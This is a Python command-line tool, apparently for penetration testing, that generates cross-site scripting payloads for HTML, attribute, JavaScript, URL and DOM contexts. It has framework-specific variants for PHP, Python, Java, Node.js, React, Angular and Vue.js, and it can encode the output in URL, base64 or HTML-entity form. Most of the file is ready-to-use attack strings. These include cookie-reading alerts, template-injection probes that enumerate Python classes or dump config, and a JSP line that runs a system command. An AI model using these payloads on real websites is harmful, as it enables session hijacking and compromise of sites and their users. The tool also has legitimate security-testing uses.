#!/usr/bin/env python3
"""
XSS Payload Generator
Generates payloads for different contexts and frameworks
"""

import sys
import base64
import urllib.parse
from colorama import init, Fore, Style

init(autoreset=True)

def generate_payloads(context='html', framework='generic', encode=False):
    """Generate XSS payloads based on context and framework"""
    
    payloads = []
    
    # Base payloads
    base_payloads = {
        'html': [
            '<script>alert(1)</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<iframe src="javascript:alert(1)">',
        ],
        'attribute': [
            '" onmouseover="alert(1)"',
            "' onmouseover='alert(1)'",
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",
            '" onclick="alert(1)"',
            "' onclick='alert(1)'",
            '" onerror="alert(1)"',
            "' onerror='alert(1)'",
        ],
        'javascript': [
            "';alert(1)//",
            '";alert(1)//',
            "';alert(1);var x='",
            '";alert(1);var x="',
            "';alert(1);/*",
            '";alert(1);/*',
            "\\';alert(1)//",
            '\\";alert(1)//',
        ],
        'url': [
            'javascript:alert(1)',
            'javascript:alert(document.cookie)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ],
        'dom': [
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<script>alert(1)</script>',
            '<body onload="alert(1)">',
            '<iframe src="javascript:alert(1)">',
        ],
    }
    
    # Framework-specific payloads
    framework_payloads = {
        'php': [
            '<?php echo "<script>alert(1)</script>"; ?>',
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "';alert(1)//",
            '";alert(1)//',
        ],
        'python': [
            '<script>alert(1)</script>',
            '{{ "".__class__.__mro__[1].__subclasses__() }}',
            '{{ config.items() }}',
            '"><script>alert(1)</script>',
        ],
        'java': [
            '<%= Runtime.getRuntime().exec("calc") %>',
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '${7*7}',
            '#{7*7}',
        ],
        'nodejs': [
            '<script>alert(1)</script>',
            '<%= alert(1) %>',
            '<%- alert(1) %>',
            '`${alert(1)}`',
            '"><script>alert(1)</script>',
        ],
        'react': [
            '<script>alert(1)</script>',
            '{alert(1)}',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '"><img src=x onerror=alert(1)>',
        ],
        'angular': [
            '{{constructor.constructor("return this")().alert(1)}}',
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '{{7*7}}',
        ],
        'vuejs': [
            '<script>alert(1)</script>',
            '<svg @load=alert(1)>',
            'v-on:load=alert(1)',
            ':href="javascript:alert(1)"',
            '"><script>alert(1)</script>',
        ],
    }
    
    # Get base payloads
    if context in base_payloads:
        payloads.extend(base_payloads[context])
    
    # Add framework-specific payloads
    if framework in framework_payloads:
        payloads.extend(framework_payloads[framework])
    
    # Remove duplicates
    payloads = list(dict.fromkeys(payloads))
    
    # Apply encoding if requested
    if encode:
        encoded_payloads = []
        for payload in payloads:
            # URL encode
            url_encoded = urllib.parse.quote(payload)
            encoded_payloads.append(f"URL: {url_encoded}")
            
            # Base64 encode
            b64_encoded = base64.b64encode(payload.encode()).decode()
            encoded_payloads.append(f"B64: {b64_encoded}")
            
            # HTML entity encode
            html_encoded = ''.join(f'&#{ord(c)};' for c in payload)
            encoded_payloads.append(f"HTML: {html_encoded}")
            
            encoded_payloads.append("---")
        
        return encoded_payloads
    
    return payloads

def main():
    print(f"""
{Fore.CYAN}{Style.BRIGHT}
╔═══════════════════════════════════════════════════════════════╗
║               XSS Payload Generator                          ║
╚═══════════════════════════════════════════════════════════════╝
{Fore.RESET}
""")
    
    print(f"{Fore.YELLOW}Available contexts:{Fore.RESET}")
    print("  html       - HTML body context")
    print("  attribute  - HTML attribute context (breaking out of quotes)")
    print("  javascript - JavaScript context (breaking out of strings)")
    print("  url        - URL/href context")
    print("  dom        - DOM-based XSS")
    print()
    print(f"{Fore.YELLOW}Available frameworks:{Fore.RESET}")
    print("  generic, php, python, java, nodejs, react, angular, vuejs")
    print()
    
    context = input(f"{Fore.CYAN}Enter context (default: html): {Fore.RESET}") or 'html'
    framework = input(f"{Fore.CYAN}Enter framework (default: generic): {Fore.RESET}") or 'generic'
    encode = input(f"{Fore.CYAN}Generate encoded versions? (y/n, default: n): {Fore.RESET}").lower() == 'y'
    
    print(f"\n{Fore.GREEN}[*] Generating payloads for {context} context ({framework} framework)...{Fore.RESET}\n")
    
    payloads = generate_payloads(context, framework, encode)
    
    print(f"{Fore.CYAN}{'='*60}{Fore.RESET}")
    print(f"{Fore.GREEN}[+] Generated {len(payloads)} payloads:{Fore.RESET}\n")
    
    for i, payload in enumerate(payloads, 1):
        print(f"{Fore.WHITE}{i:3d}. {payload}{Fore.RESET}")
    
    print(f"\n{Fore.CYAN}{'='*60}{Fore.RESET}")
    
    # Save to file
    save = input(f"\n{Fore.CYAN}Save to file? (y/n, default: n): {Fore.RESET}").lower()
    if save == 'y':
        filename = f"xss_payloads_{context}_{framework}.txt"
        with open(filename, 'w') as f:
            f.write(f"XSS Payloads - {context} context ({framework} framework)\n")
            f.write(f"Generated: {__import__('datetime').datetime.now()}\n")
            f.write("="*60 + "\n\n")
            for i, payload in enumerate(payloads, 1):
                f.write(f"{i:3d}. {payload}\n")
        print(f"{Fore.GREEN}[+] Saved to {filename}{Fore.RESET}")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        context = sys.argv[1] if len(sys.argv) > 1 else 'html'
        framework = sys.argv[2] if len(sys.argv) > 2 else 'generic'
        encode = '--encode' in sys.argv
        
        payloads = generate_payloads(context, framework, encode)
        for i, payload in enumerate(payloads, 1):
            print(f"{i:3d}. {payload}")
    else:
        main()
